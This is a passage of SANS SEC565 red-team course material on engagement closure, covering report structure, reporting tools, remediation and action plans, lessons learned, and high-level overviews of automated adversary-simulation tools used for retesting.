https://[www.scythe.io/ptef](http://www.scythe.io/ptef)

© 2022 SANS Institute	127

|  Report Outline	Engagement Closure Title Page	•	Attack Narrative Executive Summary	– Attack Diagram Goals and Objective	– List of Critical Steps Top Findings	•	Analysis and Response Methodology/Framework	– Report the good, too\! Planning	•	Red Team Findings Engagement Scenario	– People, Process, and Scope	Technology Rules of Engagement	– Tactical and Strategic Threat Intelligence	•	Conclusion |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**128** |

## **Report Outline**

Always write a report, even for a smaller red team exercise covering only a few test cases or TTPs. These reports are often all that is seen by certain stakeholders and should cover the entire effort. There are many examples available on the GitHub page in the reference. A red team report should have the following:

* **Title Page:** Clean and neat first page with name of exercise and companies involved.

* **Executive Summary:** Cover the basic top-level items that senior managers will read and walk out with.

* **Methodology/Framework:** Cover the methodology and framework used.

* **Planning:** The project manager should complete this portion covering the scenario and scope details, as well as the rules of engagement.

* **Threat Intelligence:** Include the threat intelligence report or at least the executive summary.

* **Attack Narrative:** This should be a story of how the red team started and progressed through the objective.

* **Analysis and Response:** The project manager should ensure this area is accurate and accounts for all trusted agent-provided data. Report the TTPs that were blocked and alerted, not just the things that did not get caught\!

* **Red Team Findings:** Split by people, process, and technology as well as tactical and strategic.

* **Conclusion:** Do not introduce anything new here. Thank all the stakeholders.

  Reference:

  https://github.com/juliocesarfort/public-pentesting-reports

  128	© 2022 SANS Institute

|  Tools for Red Team Reporting	Engagement Closure Consistent and efficient report creation is important VECTR Ghostwriter PlexTrac   ![][image4]  |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**129** |

## **Tools for Red Team Reporting**

VECTR is a tool that facilitates tracking of your red and blue team testing activities to measure detection and prevention capabilities across different attack scenarios. VECTR provides the ability to create assessment groups, which consist of a collection of campaigns and supporting test cases to simulate adversary threats. Campaigns can be broad and span activity across the kill chain, from initial compromise to privilege escalation and lateral movement and so on, or they can be a narrow in scope to focus on specific detection layers, tools, and infrastructure. VECTR is designed to promote full transparency between offense and defense, encourage training between team members, and improve detection and prevention success rate across the environment.

Ghostwriter is a part of your team. It helps you manage clients, projects, reports, and infrastructure in one application. It does not replace some of the more common or traditional project management tools, such as CRMs, but it does consolidate all relevant project information in a way for users to easily curate every aspect of their projects.

PlexTrac eliminates the drudgery of reporting so red teams can focus on what's most important—identifying security issues. Reports may be exported to custom Word formats with the click of a button. PlexTrac can even serve as a purple teaming client portal by granting blue team members access with role-based controls.

References:

https://vectr.io/ https://plextrac.com/

https://github.com/ghostManager/Ghostwriter/releases https://ghostwriter.wiki/

© 2022 SANS Institute	129

## **Module Summary: Engagement Closure**

In this module we discussed the necessary steps in the closure phase of the engagement. We need to clean up the environment, ensure all our actions were recorded, and compile our analysis. We then focus on the report and prepare for any meetings or presentations.

## **Module Objectives: Retesting**

In the final module of the course, we want to be prepared to retest after the blue team has had a chance to tighten their security controls. We want to provide a remediation and action plan and establish a retesting plan. We have several options for automated retesting. Ultimately, we must provide business value in our actions that include retesting long after an engagement.

138	© 2022 SANS Institute

|  Remediation and Action Plan	Retesting Project manager should take lead to obtain recommendations Split by people, process, and technology; tactical and strategic Issue owners should ultimately choose and accept action plan Red and blue team provides recommendations Technology owners will choose how to remediate and accept milestones Continue to track the issues and perform retests to close items Don't forget lessons learned for the exercise team Constant state of improvement If you do not stay one step ahead of the game, you will be left behind |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**139** |

## **Remediation and Action Plan**

Although the final step of an Adversary Emulation Red Team Exercise, the work is just starting for those that will own the remediation action plan. The project manager should take the lead in obtaining recommendations from the trusted agents and the proposed remediation action plan owners. It is important to ensure the owners accept the recommendations as they will be responsible for ensuring implementation following the suggested timelines. It is a good idea to split the remediations in tactical (short term) and strategic (long term) recommendations as well as people, process, and technology. Many organizations may have the technology remediation part down due to years of vulnerability management experience, but the people and process issues may be new to deal with.

## **Lessons Learned**

The project manager should collect lessons learned of the exercise itself to improve on those areas in the following exercise. Some things to consider:

* Were the trusted agents the correct people that should be involved? Should others be added, or should some be removed on the next round?

* Should planning activities begin before the threat intelligence portion? This may be the case for regulatory required tests.

  © 2022 SANS Institute	139

|  Example: Remediation and Action Plan	Retesting People: Executive administrator falls for spear phishing Tactical: Speak with the executive administrator; show what failed Strategic: Implement a quarterly social engineering program to actively test end users against emulated phishing attacks Process: Too long between detection and IR analyst assignment Tactical: Manager receives notification when IR analyst not assigned Strategic: Perform a lean assessment to cut waste and improve time Technology: Outbound TCP 21 allowed Tactical: Block or monitor TCP port 21 Strategic: Perform assessment of allowed outbound connections |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**140** |

## **Example: Remediation and Action Plan**

This slide covers an example for people, process, and technology broken up in tactical and strategic solutions. A red team engagement will reveal several issues spanning these areas and breaking them up will allow for easier assignment, ownership, and tracking.

140	© 2022 SANS Institute

|  Retesting and Automated Red Team	Retesting The red team may be asked to validate fixes Retesting technology issues is easier than people and process Red team may want to automate or simulate TTPs on a continuous basis APT Simulator Network Flight Simulator Atomic Red Team MITRE® Caldera™ SCYTHE |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**141** |

## **Retesting and Automated Red Team**

The red team may be asked to retest several issues during the remediation phase. Testing technology issues is much easier than people and process. There are many products available for automating and retesting test cases and TTPs used in red team exercises and Adversary Emulation. This slide lists a few to consider:

* APT Simulator

* Network Flight Simulator

* Atomic Red Team

* MITRE® Caldera™

* SCYTHE

  © 2022 SANS Institute	141

|  APT Simulator	Retesting Windows-based tool that makes a system look like it was victim of an attack Written by Florian Roth Supports a wide variety of the ATT\&CK® tactics Primarily built on BAT files Highly customizable |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**142** |

## **APT Simulator**

APT Simulator was written by Florian Roth (Nextron Systems) and was designed to test endpoints via Windows Batch scripts. This allows for automated retesting and continuous testing of:

* Endpoint detection and response tools

* Security monitoring capabilities

* Response effectiveness

  From its official documentation: "APT Simulator is a Windows Batch script that uses a set of tools and output files to make a system look as if it was compromised. In contrast to other adversary simulation tools, APT Simulator is designed to make the application as simple as possible. You don't need to run a web server, database or any agents on set of virtual machines. Just download the prepared archive, extract and run the contained Batch file as Administrator. Running APT Simulator takes less than a minute of your time."

  Reference: https://github.com/NextronSystems/APTSimulator

  142	© 2022 SANS Institute

|  Network Flight Simulator (flightsim)	Retesting Developed by AlphaSOC Focus on network-level detection Supports a variety of suspicious network connectivity DNS Tunneling Domain Generation Algorithms Known bad domains Tor |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**143** |

## **Network Flight Simulator (flightsim)**

While APT Simulator is mostly focused on endpoint controls, Network Flight Simulator (developed by AlphaSOC) focuses on network-level detection. It supports the simulation of a variety of suspicious network connectivity:

* DNS tunneling

* Domain Generation Algorithms (DGA)

* Known bad domains

* Tor

  According to its official documentation: "flightsim is a lightweight utility used to generate malicious network traffic and help security teams to evaluate security controls and network visibility. The tool performs tests to simulate DNS tunneling, DGA traffic, requests to known active C2 destinations, and other suspicious traffic patterns."

  Reference:

  https://github.com/alphasoc/flightsim

  © 2022 SANS Institute	143

|  Atomic Red Team	Retesting Red Canary has developed "Atomic Red Team" A series of "simple" tests that can be used to emulate the behavior of adversaries in the environment All tests are fully linked to MITRE ATT\&CK®\! |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**144** |

## **Atomic Red Team**

The goal of Atomic Red Team (created by Red Canary) is to "allow every security team to test their controls by executing simple 'atomic tests' that exercise the same techniques used by adversaries (all mapped to MITRE's ATT\&CK®)." This is very much in line with a purple team approach: empower the blue team to test prevention and detection of various adversary techniques\!

References: https://github.com/redcanaryco/atomic-red-team https://detectionlab.network/usage/atomicredteam/ https://atomicredteam.io/

144	© 2022 SANS Institute

|  MITRE® CALDERA™	Retesting CALDERA™ is a tool built by MITRE®, with the express purpose of doing adversary emulation Actively "attack" target systems by deploying custom backdoors Linked to the ATT\&CK® |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**145** |

## **MITRE**® **Caldera**™

While the previously mentioned tools were rather "simple" to set up and configure, CALDERA is a bit different\! It requires a bit of setup (as a server needs to be installed) and it will actively "attack" target systems by deploying custom backdoors. CALDERA's attack steps are fully linked to the ATT\&CK® framework techniques.

References:

https://github.com/mitre/caldera https://caldera.readthedocs.io/en/latest/

© 2022 SANS Institute	145

|  SCYTHE	Retesting Enterprise grade C2 framework with automation language Large Threat Catalog and growing community Largest, public repository of adversary emulation plans: https://github.com/scythe-io/community-threats Covers most of the ATT\&CK® Framework and all of Atomic Red Team Payloads for Windows, Linux, & macOS Very easy to use Focus on showing value |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**146** |

## **SCYTHE**

SCYTHE provides an advanced attack emulation platform for the enterprise and cybersecurity consulting market. The SCYTHE platform enables red, blue, and purple teams to build and emulate real-world adversarial campaigns in a matter of minutes. Customers are, in turn, enabled to validate the risk posture and exposure of their business and employees and the performance of enterprise security teams and existing security solutions.

References:

https://[www.scythe.io/](http://www.scythe.io/) https://github.com/scythe-io/community-threats

146	© 2022 SANS Institute

|  Always Provide Business Value	Retesting Call to Action\! Everything done in offensive operations must bring business value Focus on the original goals and objectives Getting in and meeting the adversary objectives is great\! But report it with the same care and diligence you did the test Put yourself in the perspective of the audience Work together, collaborate, improve, repeat |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**147** |

## **Always Provide Business Value**

Everything you do in offensive operations should bring business value. Focus on the original goals and objectives. Getting in and meeting the adversary objectives is great\! However, report it with the same care and diligence you used during the test execution. Put yourself in the perspective of the audience and be sensitive to others. Work together, collaborate, improve, repeat. This will make you an awesome red teamer\!

© 2022 SANS Institute	147

|  Module Summary: Retesting Remediation and Action Plan Retesting and Automated Red Team APT Simulator Network Flight Simulator Atomic Red Team MITRE® CALDERA™ SCYTHE Always Provide Business Value |  |

## **Module Summary: Retesting**

We've wrapped up the engagement, but our work may not end there. After delivering the report and working with the blue team to create action plans, we must be prepared to retest. We can use automation tools to aid in retesting. Ultimately, we must provide business value in our actions that include retesting long after an engagement.

148	© 2022 SANS Institute

|  Conclusion for SEC565 Threat Intelligence	Planning Threat intelligence drives the	Triggers, TTPs, and Adversary definition of the objectives, TTPs,		Emulation are defined along with and attack infrastructure	final objectives and scope. requirements. Red Team Framework & Methodology Closure	(RTFM)	Execution Appropriate reporting,		Actions are mapped to the recommendations for remediation,	ATT\&CK® framework and the and an action plan will be shared		Unified Kill Chain. The red team and distributed.	will test the people, processes, and technologies. |  |
| ----- | :---- |
|  ![][image1] | SEC565 | Red Team Operations and Adversary Emulation	**149** |

## **Conclusion for SEC565**

This concludes SEC565: Red Team Operations and Adversary Emulation\!

We began by introducing you to red team engagements and adversary emulations to show how they differ from other security testing types such as vulnerability assessments, penetration tests, and purple teaming. We covered several industry frameworks (including the Cyber Kill Chain®, Unified Kill Chain, and ATT\&CK®, among others) for red team exercises and adversary emulations. Threat intelligence is a main factor that triggers red team exercises. A successful red teamer needs to know how to obtain and consume threat intelligence to successfully plan and execute an adversary emulation. We covered planning, learned what triggers an engagement and how to define objectives and scope, and set up attack infrastructure. We covered roles and responsibilities and establishing the rules of engagement. With a strong plan, an exercise execution phase can begin. We covered red team planning and weaponization.

Then we covered the network propagation phase of the Unified Kill Chain mapping red team steps to the MITRE ATT\&CK® framework. We covered several adversary tactics, techniques, and procedures for discovery, privilege escalation, persistence, defense evasion, execution, accessing credentials, lateral movement, and pivoting. We then covered the action on the objectives phase of an adversary emulation where the red team achieves the engagement goals and objectives. Then we wrapped up with closure. Here is where analysis and response is documented by correlating blue team data with the actions performed by the red team. We covered reporting and how to show Red Team Engagements and Adversary Emulation improve the overall security of the organization.

We sincerely hope you have found this course to be valuable allowing you to leverage what you have learned immediately upon returning to work.

© 2022 SANS Institute	149
